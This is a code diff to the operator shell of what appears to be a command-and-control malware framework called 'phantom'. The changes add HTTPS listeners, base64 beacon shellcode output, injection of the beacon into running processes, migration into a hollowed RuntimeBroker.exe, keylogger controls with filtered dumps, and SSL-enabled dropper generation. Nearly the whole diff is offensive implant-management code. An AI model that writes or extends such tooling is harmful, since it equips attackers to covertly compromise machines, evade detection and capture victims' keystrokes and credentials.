@@ -69,11 +69,12 @@ class C2Shell(cmd.Cmd):
         return stop
 
     def do_listeners(self, arg):
-        """listeners [start <port> [host] | stop] - Manage C2 listener."""
+        """listeners [start <port> [host] [use_ssl]] | stop] - Manage C2 listener."""
         parts = arg.split()
         if not parts:
             if server_instance.thread and server_instance.thread.is_alive():
-                console.print(f"[*] Listener [green]ACTIVE[/green] on {server_instance.host}:{server_instance.port}")
+                proto = "HTTPS" if server_instance.use_ssl else "HTTP"
+                console.print(f"[*] Listener [green]ACTIVE[/green] ({proto}) on {server_instance.host}:{server_instance.port}")
             else:
                 console.print("[*] Listener [red]INACTIVE[/red]")
             return
@@ -81,17 +82,19 @@ class C2Shell(cmd.Cmd):
         action = parts[0]
         if action == "start":
             try:
-                port = int(parts[1]) if len(parts) > 1 else (session.lport or 443)
+                port = int(parts[1]) if len(parts) > 1 else (session.lport or 8080)
                 host = parts[2] if len(parts) > 2 else (session.lhost or "0.0.0.0")
-                server_instance.start(host=host, port=port)
-                notifier.success(f"Started listener on {host}:{port}")
+                use_ssl = parts[3].lower() in ("true", "1", "yes", "https") if len(parts) > 3 else False
+                server_instance.start(host=host, port=port, use_ssl=use_ssl)
+                proto = "HTTPS" if use_ssl else "HTTP"
+                notifier.success(f"Started {proto} listener on {host}:{port}")
             except Exception as e:
                 notifier.error(f"Failed to start listener: {e}")
         elif action == "stop":
             server_instance.stop()
             notifier.success("Stopped listener")
         else:
-            notifier.error("Usage: listeners start [port] [host] | listeners stop")
+            notifier.error("Usage: listeners start [port] [host] [use_ssl] | listeners stop")
 
     def do_beacons(self, arg):
         """beacons - list active beacons with real-time status"""
@@ -341,18 +344,23 @@ class C2Shell(cmd.Cmd):
 
     def do_generate_shellcode(self, arg):
         """generate_shellcode [platform] - Generate Base64 shellcode for inject/migrate."""
-        from phantom.utils.builder import _PLATFORM_OUT
         import os
         import base64
         import phantom
         
         platform = arg.strip() or "windows"
-        if platform not in _PLATFORM_OUT:
-            notifier.error(f"Invalid platform. Choose from: {list(_PLATFORM_OUT.keys())}")
-            return
-            
+        
         beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
-        beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT[platform])
+        if platform == "windows":
+            beacon_path = os.path.join(beacon_dir, "beacon.bin")
+        else:
+            from phantom.utils.builder import _PLATFORM_OUT
+            if platform not in _PLATFORM_OUT:
+                from rich.console import Console
+                console = Console()
+                console.print(f"[red]Invalid platform. Choose from: {list(_PLATFORM_OUT.keys())}[/red]")
+                return
+            beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT[platform])
         
         if not os.path.exists(beacon_path):
             notifier.error(f"Beacon binary not found at {beacon_path}. Run 'generate {platform}' first.")
@@ -361,10 +369,13 @@ class C2Shell(cmd.Cmd):
         with open(beacon_path, "rb") as f:
             b64 = base64.b64encode(f.read()).decode()
             
+        from rich.console import Console
+        from rich.panel import Panel
+        console = Console()
         console.print(Panel(b64, title=f"Base64 Shellcode ({platform})", border_style="green"))
         console.print("[dim]Copy this string to use with 'inject <pid> <string>' or 'migrate <string>'[/dim]")
 
-    def _wait_for_result(self, task_id, timeout=10):
+    def _wait_for_result(self, task_id, timeout=30):
         """Helper to poll for a specific task result."""
         import time
         from phantom.utils.c2_helpers import format_beacon_output
@@ -385,8 +396,11 @@ class C2Shell(cmd.Cmd):
         return False
 
     def do_inject(self, arg):
-        """inject <pid> - Inject beacon into a process (Windows only)"""
-        from phantom.utils.builder import _PLATFORM_OUT
+        """inject <pid> - Inject beacon shellcode into a running process PID.
+        
+        The original beacon stays alive. The target process gets a NEW beacon.
+        After ~sleep ms, both will appear in 'beacons' list.
+        """
         import os
         import base64
         import phantom
@@ -402,10 +416,10 @@ class C2Shell(cmd.Cmd):
         pid = parts[0]
         
         beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
-        beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT["windows"])
+        beacon_path = os.path.join(beacon_dir, "beacon.bin")
         
         if not os.path.exists(beacon_path):
-            notifier.error(f"Beacon binary not found. Run 'generate windows' first.")
+            notifier.error(f"Beacon binary not found at {beacon_path}. Run 'generate windows' first.")
             return
             
         with open(beacon_path, "rb") as f:
@@ -416,8 +430,13 @@ class C2Shell(cmd.Cmd):
         self._wait_for_result(task_id)
 
     def do_migrate(self, arg):
-        """migrate [pid] - Migrate beacon to a process (Windows only). If PID is omitted, spawns notepad.exe."""
-        from phantom.utils.builder import _PLATFORM_OUT
+        """migrate [pid] - Fully migrate beacon to a new hollowed process.
+        
+        Spawns a new sacrificial process (RuntimeBroker.exe), replaces its
+        memory with the beacon PE, and terminates the original beacon.
+        Only the new beacon remains (1 in 'beacons' list).
+        The PID argument is accepted but the beacon always spawns a fresh process.
+        """
         import os
         import base64
         import phantom
@@ -428,16 +447,15 @@ class C2Shell(cmd.Cmd):
             
         pid = arg.strip()
         beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
-        beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT["windows"])
+        beacon_path = os.path.join(beacon_dir, "beacon.pe")
         
         if not os.path.exists(beacon_path):
-            notifier.error(f"Beacon binary not found. Run 'generate windows' first.")
+            notifier.error(f"Beacon PE not found at {beacon_path}. Run 'generate windows' first.")
             return
             
         with open(beacon_path, "rb") as f:
             b64 = base64.b64encode(f.read()).decode()
             
-        # If PID is provided, we send 'migrate <pid> <b64>', otherwise 'migrate <b64>'
         cmd = f"migrate {pid} {b64}" if pid else f"migrate {b64}"
         task_id = c2_state.queue_task(self.active_beacon, cmd)
         notifier.info(f"Migration task queued (ID: {task_id}). Waiting for output...")
@@ -459,17 +477,20 @@ class C2Shell(cmd.Cmd):
         self._wait_for_result(task_id)
 
     def do_keylog(self, arg):
-        """keylog <start|stop|dump> - Manage keylogger instance (Windows only)"""
+        """keylog <start|stop|status|dump> - Manage keylogger instance (Windows only)"""
         if not self.active_beacon:
             notifier.error("No active beacon.")
             return
         
         parts = arg.split()
-        if not parts or parts[0] not in ["start", "stop", "dump"]:
-            notifier.error("Usage: keylog <start|stop|dump>")
+        if not parts or parts[0] not in ["start", "stop", "status", "dump"]:
+            notifier.error("Usage: keylog <start|stop|status|dump [filter]>")
             return
             
-        task_id = c2_state.queue_task(self.active_beacon, f"keylog {parts[0]}")
+        cmd = f"keylog {parts[0]}"
+        if parts[0] == "dump" and len(parts) > 1:
+            cmd += " " + " ".join(parts[1:])
+        task_id = c2_state.queue_task(self.active_beacon, cmd)
         notifier.info(f"Keylog {parts[0]} task queued (ID: {task_id}). Waiting for output...")
         self._wait_for_result(task_id)
 
@@ -548,22 +569,22 @@ class C2Shell(cmd.Cmd):
         import phantom
         pkg_root = os.path.dirname(phantom.__file__)
         host = session.lhost or get_lhost()
-        port = int(session.lport) or (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443)
-
+        port = int(session.lport) or (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 8080)
+        use_ssl = server_instance.use_ssl if (server_instance.thread and server_instance.thread.is_alive()) else False
+        
         # Compile and generate dropper
         try:
-            beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch)
+            beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch, host=host, port=port)
         except Exception as e:
             notifier.error(f"Compilation process crashed: {e}")
             return
             
         if not beacon_path:
             return
-
         if not (server_instance.thread and server_instance.thread.is_alive()):
             notifier.warn(f"Listener not active. Run: listeners start {port}")
 
-        dropper = generate_dropper(platform, host, port, arch=arch)
+        dropper = generate_dropper(platform, host, port, arch=arch, use_ssl=use_ssl)
         if not dropper:
             notifier.error(f"Failed to generate dropper for {platform}")
             return
